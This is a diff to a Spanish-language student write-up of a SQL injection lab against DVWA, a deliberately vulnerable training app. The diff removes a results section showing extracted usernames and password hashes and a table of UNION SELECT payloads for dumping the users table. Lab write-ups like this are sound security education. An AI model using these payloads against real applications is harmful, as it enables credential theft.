@@ -68,44 +68,7 @@ Y pulsa el botón **Submit**.
 
 ![Usuarios y Contraseñas](assets/SQL_Resultado.png) 
 
----
-
-### 3. Consultar los resultados
-
-Después de enviar el formulario, serás redirigido automáticamente a:
-
-```
-http://127.0.0.1/dvwa/vulnerabilities/sqli/high.php
-```
-
-Ahí verás los resultados de la inyección SQL. Por ejemplo:
-
-```
-ID: 1' UNION SELECT user, password FROM users#
-First name: admin
-Surname: admin
-
-First name: smithy
-Surname: 5f4dcc3b5aa765d61d8327deb882cf99
-
-First name: gordonb
-Surname: e99a18c428cb38d5f260853678922e03
-
-...
-```
-
 Estos valores corresponden a los usuarios y contraseñas almacenadas en la tabla `users` de DVWA.
-
----
-
-## 🦪 Payloads útiles
-
-| Objetivo                               | Payload                                                       |
-| -------------------------------------- | ------------------------------------------------------------- |
-| Extraer usuario y contraseña           | `1' UNION SELECT user, password FROM users#`                  |
-| Ver solo un usuario (primer resultado) | `1' UNION SELECT user, password FROM users LIMIT 1#`          |
-| Ver el segundo usuario                 | `1' UNION SELECT user, password FROM users LIMIT 1 OFFSET 1#` |
-| Insertar valores personalizados        | `1' UNION SELECT 'root','toor'#`                              |
 
 ---
 
@@ -127,12 +90,4 @@ Este ejercicio está diseñado para realizarse en un entorno de pruebas controla
 - 📖 [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
 - ▶️ [Vídeo tutorial utilizado](https://youtu.be/5bj1pFmyyBA)
 - 📘 [Writeup de Aftab Sama sobre SQLi en DVWA](https://aftabsama.com/writeups/dvwa/sql-injection/#security-level-high)
-
----
-
-## 👨‍💼 Autor
-
-**Carlos Peris Navarro**  
-Estudiante de Ciberseguridad
-
 
